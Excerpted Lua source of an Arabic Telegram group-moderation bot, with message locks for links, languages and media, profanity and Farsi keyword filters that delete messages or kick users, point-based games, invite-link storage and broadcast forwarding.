end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(SURSBER..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(SURSBER..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(SURSBER..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevAbs:get(SURSBER..'Rio:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevAbs:get(SURSBER..'Rio:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevAbs:get(SURSBER..'Rio:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source SURSBER     --
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevAbs:get(SURSBER..'Rio:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevAbs:get(SURSBER..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevAbs:get(SURSBER..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
...
if DevAbs:get(SURSBER.."Rio:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source SURSBER     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevAbs:get(SURSBER..'Rio:Lock:BotWelcome') then 
...
if DevAbs:sismember(SURSBER..'Rio:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n᥀︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n᥀︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevAbs:get(SURSBER.."Rio:Text:BotWelcome") then RioText = DevAbs:get(SURSBER.."Rio:Text:BotWelcome") else RioText = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevAbs:get(SURSBER.."Rio:Photo:BotWelcome") then RioPhoto = DevAbs:get(SURSBER.."Rio:Photo:BotWelcome") elseif rio.photos_[0] then RioPhoto = rio.photos_[0].sizes_[1].photo_.persistent_id_ else RioPhoto = nil end 
...
if DevAbs:get(SURSBER..'Rio:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source SURSBER     --
...
if DevAbs:get(SURSBER..'Rio:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevAbs:get(SURSBER..'Rio:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevAbs:get(SURSBER..'Rio:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevAbs:get(SURSBER..'Rio:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevAbs:get(SURSBER..'Rio:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevAbs:get(SURSBER..'Rio:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevAbs:get(SURSBER..'Rio:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevAbs:get(SURSBER..'Rio:Spam:Text'..msg.chat_id_))
end
if DevAbs:get(SURSBER..'Rio:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source SURSBER     --
if DevAbs:get(SURSBER.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"᥀︙تم الغاء حفظ الرابط")       
DevAbs:del(SURSBER.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevAbs:set(SURSBER.."Rio:Groups:Links"..msg.chat_id_,Link)
...
if DevAbs:get('SURSBERTeam:'..SURSBER.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('SURSBERTeam:'..SURSBER..'id:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevAbs:del('SURSBERTeam:'..SURSBER.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('SURSBERTeam:'..SURSBER.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('SURSBERTeam:'..SURSBER..'id:user'..msg.chat_id_)  
DevAbs:incrby(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Rio(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' رساله', 1, 'md')
DevAbs:del('SURSBERTeam:'..SURSBER..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevAbs:get('SURSBERTeam:'..SURSBER.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('SURSBERTeam:'..SURSBER..'ids:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevAbs:del('SURSBERTeam:'..SURSBER.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('SURSBERTeam:'..SURSBER.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('SURSBERTeam:'..SURSBER..'ids:user'..msg.chat_id_)  
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevAbs:get(SURSBER.."Rio:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevAbs:get(SURSBER.."Rio:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAbs:get(SURSBER.."Rio:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevAbs:get(SURSBER.."Rio:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevAbs:get(SURSBER.."Rio:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local List = DevAbs:smembers(SURSBER..'Rio:Groups') 
local BotName = (DevAbs:get(SURSBER.."Rio:NameBot") or 'ديفد')
local GetJson = '{"BotId": '..SURSBER..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevAbs:get(SURSBER.."Rio:Groups:Links"..v)
Welcomes = DevAbs:get(SURSBER..'Rio:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
RioConstructors = DevAbs:smembers(SURSBER..'Rio:RioConstructor:'..v)
Constructors = DevAbs:smembers(SURSBER..'Rio:BasicConstructor:'..v)
BasicConstructors = DevAbs:smembers(SURSBER..'Rio:Constructor:'..v)
Managers = DevAbs:smembers(SURSBER..'Rio:Managers:'..v)
Admis = DevAbs:smembers(SURSBER..'Rio:Admins:'..v)
Vips = DevAbs:smembers(SURSBER..'Rio:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
--     Source SURSBER     --
if DevAbs:get(SURSBER.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Rio( msg.chat_id_, msg.id_, 1,"᥀︙يوجد فقط ( 6 ) اختيارات\n᥀︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevAbs:get(SURSBER.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(SURSBER.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevAbs:get(SURSBER..'DevAbs4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "᥀︙تم الغاء الامر")
DevAbs:del(SURSBER..'DevAbs4'..msg.sender_user_id_)
return false  end 
DevAbs:del(SURSBER..'DevAbs4'..msg.sender_user_id_)
...
DevAbs:set(SURSBER..'Rio:ChId',data.id_)
else
...
--     Source SURSBER     --
if DevAbs:get(SURSBER.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevAbs:del(SURSBER.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
DevAbs:del(SURSBER.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevAbs:set(SURSBER.."DevText", DevText)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ كليشة المطور", 1, "md")
end
if DevAbs:get(SURSBER..'Rio:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevAbs:del(SURSBER..'Rio:NameBot'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ اسم البوت ', 1, 'html')
DevAbs:del(SURSBER..'Rio:NameBot'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:NameBot', text)
return false 
end
--     Source SURSBER     --
if text == "الرابط" then
if not DevAbs:get(SURSBER..'Rio:Lock:GpLinks'..msg.chat_id_) then 
if DevAbs:get(SURSBER.."Rio:Groups:Links"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevAbs:get(SURSBER.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
else 
...
--     Source SURSBER     --
if text == "الرابط" then
if not DevAbs:get(SURSBER.."Rio:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevAbs:get(SURSBER.."Private:Group:Link"..msg.chat_id_) 
...
NameBot = (DevAbs:get(SURSBER..'Rio:NameBot') or 'ديفد')
local SURSBERTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevAbs2 = math.random(#SURSBERTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam[DevAbs2] , 1, 'html') 
return false
end
...
if text and text == (DevAbs:get(SURSBER..'Rio:NameBot') or 'ديفد') then 
NameBot = (DevAbs:get(SURSBER..'Rio:NameBot') or 'ديفد')
...
if tonumber((DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد النقاط التي ربحتها ↫ '..(DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevAbs:del(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevAbs:del(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع نقاطك', 1, 'md') end
--     Source SURSBER     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevAbs:get(SURSBER..'Rio:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(SURSBER..'Rio:GameNum'..msg.chat_id_,name)
DevAbs:del(SURSBER..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevAbs:get(SURSBER..'Rio:GameNum'..msg.chat_id_) and not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then 
SURSBERTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Rio(msg.chat_id_, msg.id_, 1,SURSBERTeam, 1, 'md')
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(SURSBER..'Rio:Games:Ids'..msg.chat_id_,true)
end
...
if not DevAbs:get(SURSBER..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevAbs:set(SURSBER.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevAbs:setex(SURSBER.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(SURSBER..'Rio:GameNum2'..msg.chat_id_,name)
DevAbs:del(SURSBER..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevAbs:get(SURSBER..'Rio:GameNum2'..msg.chat_id_) and not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(SURSBER..'Rio:GameNum3'..msg.chat_id_,name)
DevAbs:del(SURSBER..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevAbs:get(SURSBER..'Rio:GameNum3'..msg.chat_id_) and not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then 
...
DevAbs2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(SURSBER..'Rio:GameNum4'..msg.chat_id_,name)
DevAbs:del(SURSBER..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
if text == DevAbs:get(SURSBER..'Rio:GameNum4'..msg.chat_id_) and not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(SURSBER..'Rio:GameNum5'..msg.chat_id_,name)
DevAbs:del(SURSBER..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevAbs:get(SURSBER..'Rio:GameNum5'..msg.chat_id_) then
if not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(SURSBER..'Rio:GameNum5'..msg.chat_id_)
...
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(SURSBER..'Rio:GameNum6'..msg.chat_id_,name)
DevAbs:del(SURSBER..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevAbs:get(SURSBER..'Rio:GameNum6'..msg.chat_id_) then
if not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(SURSBER..'Rio:GameNum6'..msg.chat_id_)
...
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(SURSBER..'Rio:GameNum7'..msg.chat_id_,name)
DevAbs:del(SURSBER..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevAbs:get(SURSBER..'Rio:GameNum7'..msg.chat_id_) then
if not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(SURSBER..'Rio:GameNum7'..msg.chat_id_)
...
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(SURSBER..'Rio:GameNum8'..msg.chat_id_,name)
DevAbs:del(SURSBER..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevAbs:get(SURSBER..'Rio:GameNum8'..msg.chat_id_) then
if not DevAbs:get(SURSBER..'Rio:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(SURSBER..'Rio:GameNum8'..msg.chat_id_)
...
--     Source SURSBER     --
if DevAbs:get(SURSBER.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Rio(msg.chat_id_, msg.id_, 1,"᥀︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevAbs:get(SURSBER.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(SURSBER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbs:del(SURSBER.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:incrby(SURSBER..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevAbs:get(SURSBER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevAbs:del(SURSBER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbs:del(SURSBER.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevAbs:get(SURSBER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevAbs:get(SURSBER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevAbs:set(SURSBER.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n᥀︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevAbs:setex(SURSBER.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source SURSBER     --
...
if not DevAbs:get(SURSBER..'Rio:Lock:Games'..msg.chat_id_) then
DevAbs:del(SURSBER.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAbs:del(SURSBER..'Rio:ListRolet'..msg.chat_id_)  
DevAbs:setex(SURSBER.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevAbs:get(SURSBER.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "᥀︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevAbs:set(SURSBER.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '᥀︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n᥀︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevAbs:del(SURSBER.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevAbs:get(SURSBER.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevAbs:sismember(SURSBER..'Rio:ListRolet'..msg.chat_id_,text) then
...
DevAbs:sadd(SURSBER..'Rio:ListRolet'..msg.chat_id_,text)
local CountAdd = DevAbs:get(SURSBER.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevAbs:scard(SURSBER..'Rio:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevAbs:del(SURSBER.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAbs:setex(SURSBER.."Rio:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
DevAbs0 = (DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevAbs:incrby(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevAbs0)
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙تم بيع '..(DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n᥀︙كل نقطه تساوي 50 رساله', 'md')
DevAbs:del(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source SURSBER     --
...
DevAbs:sadd(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevAbs:sadd(SURSBER..'Rio:RioConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
if DevAbs:get(SURSBER.."Rio:Left:Bot"..SURSBER) then
...
local msguser = tonumber(DevAbs:get(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAbs:get(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAbs:get(SURSBER..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
...
DevAbs:setex(SURSBER..'DevAbs4'..msg.sender_user_id_,360,true)
...
function SURSBERTeam(extra,result,success)
if DevAbs:get(SURSBER.."Rio:Send:Bot"..SURSBER) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevAbs:smembers(SURSBER.."Rio:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevAbs:smembers(SURSBER.."Rio:Users")
...
DevAbs:set(SURSBER..'Rio:viewget'..msg.sender_user_id_,true)
...
if DevAbs:get(SURSBER.."Rio:Kick:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAbs:set(SURSBER..'yes'..msg.sender_user_id_, 'delyes')
